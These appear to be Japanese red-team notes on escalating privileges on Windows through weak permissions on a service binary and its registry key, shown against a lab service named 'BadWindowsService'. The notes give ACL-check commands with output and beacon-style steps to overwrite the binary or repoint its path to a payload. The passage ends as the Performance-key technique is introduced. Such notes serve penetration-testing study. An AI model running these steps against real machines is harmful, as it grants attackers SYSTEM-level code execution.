## Service File Permissions
### 概要
サービスが実行するバイナリ自体、またはその親ディレクトリから継承したACEが弱い場合、標準ユーザーがバイナリを**直接上書き**できる。SCM（Service Control Manager）は次回サービス起動時にそのバイナリを実行する。

### 権限確認

```bash
cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
# → NT AUTHORITY\Authenticated Users: F（フルコントロール）
```

### 攻撃手順

```bash
cd "C:\Program Files\Bad Windows Service\Service Executable\"

sc_stop BadWindowsService          # 実行中はバイナリを上書きできないため停止が必要

upload C:\Payloads\BadWindowsService.exe   # 正規バイナリをペイロードで上書き

sc_start BadWindowsService         # 再起動で実行
```

> **注意：** これは元のサービスバイナリを完全に破壊する**破壊的な操作**。サービス停止権限が付与されていることが前提であり、これ自体もデフォルトでない設定ミスである。

## Service Registry Permissions
### 概要
サービスの設定は `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>` に書き込まれる。インストール時にこのキーへ弱いACEが付与されていると、攻撃者がサービス設定を改ざんしてペイロードを実行させることができる。

### 権限確認
```powershell
powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl
```

```
Path   : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BadWindowsService
Owner  : BUILTIN\Administrators
Access : NT AUTHORITY\Authenticated Users  Allow  FullControl   ← 脆弱
         BUILTIN\Users                     Allow  ReadKey
         BUILTIN\Administrators            Allow  FullControl
         NT AUTHORITY\SYSTEM              Allow  FullControl
```

### 攻撃手法
#### ① バイナリパスの書き換え（ストレートな手法）
サービスが参照するバイナリパスを直接ペイロードのパスに変更する。

```bash
sc_stop BadWindowsService
sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
sc_start BadWindowsService
```

#### ② Performance レジストリキーの悪用（ステルス手法）
Clément Labro により発見された手法。`Performance` キーはサービスのパフォーマンス監視用DLLを指定するオプションのレジストリキーで、**本番環境ではほとんど存在しない**ため、サービスの正常動作を妨げずにこっそり追加できる。